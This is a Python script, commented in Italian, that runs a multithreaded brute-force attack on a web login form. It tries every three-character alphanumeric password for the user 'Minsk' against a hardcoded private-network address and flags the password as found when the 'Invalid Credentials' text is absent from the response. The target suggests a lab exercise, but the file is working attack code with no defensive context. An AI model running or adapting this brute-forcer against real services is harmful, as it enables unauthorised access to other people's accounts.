import string
import requests
import numpy as np
import pandas as pd
from pathlib import Path
import threading
from py_console import console


termina_ricerca = threading.Lock()

class EseguiAttacco(threading.Thread):
    def __init__(self,lista_combinazioni, num_thread):
        threading.Thread.__init__(self)
        self.lista_combinazioni = lista_combinazioni
        self.num_thread = num_thread
    def run(self):
        for combinazione in self.lista_combinazioni:

            console.info(f"Thread numero: {self.num_thread} dice: password provata = {combinazione}")

            try:
                risultato = requests.post(url, data={"username":"Minsk", "password":combinazione}).text
            except:
                console.error(f"Thread numero: {self.num_thread} dice: errore richiesta")
            
            #print(risultato)
            # capire il risultato
            if "Invalid Credentials" not in risultato:
                console.success(f"Thread numero: {self.num_thread} dice: password trovata = {combinazione}")
                termina_ricerca.acquire()

            if termina_ricerca.locked():
                break
        

url = "http://192.168.0.128:5000/"
numero_thread = 80
luogo_dati = "creati"

dir_path = str(Path(__file__).parent.resolve())+"/"

lettere = string.ascii_letters
numeri = "0123456789"
caratteri = lettere+numeri



def main():

    arrayCombinazioni = np.array([])

    if luogo_dati == "creati":
        arrayCombinazioni = pd.read_csv(f"{dir_path}combinazioni.csv")["combinazioni"].values
    elif luogo_dati == "da creare":
        lista = ["   " for _ in range(len(caratteri)**3)]
        arrayCombinazioni = np.array(lista)

        count = 0

        for char1 in caratteri:
            for char2 in caratteri:
                for char3 in caratteri:
                    arrayCombinazioni[count] = char1+char2+char3
                    count += 1
                    
        pd.DataFrame(arrayCombinazioni, columns=["combinazioni"]).to_csv(f"{dir_path}combinazioni.csv")

    np.random.shuffle(arrayCombinazioni)


    num_elementi_per_lista = int((len(caratteri)**3) / numero_thread)
    elementi_dati = 0

    for n in range(numero_thread):
        EseguiAttacco(arrayCombinazioni[elementi_dati : elementi_dati + num_elementi_per_lista], n).start()
        elementi_dati += num_elementi_per_lista
 

if __name__ == '__main__':
    main()
    
    


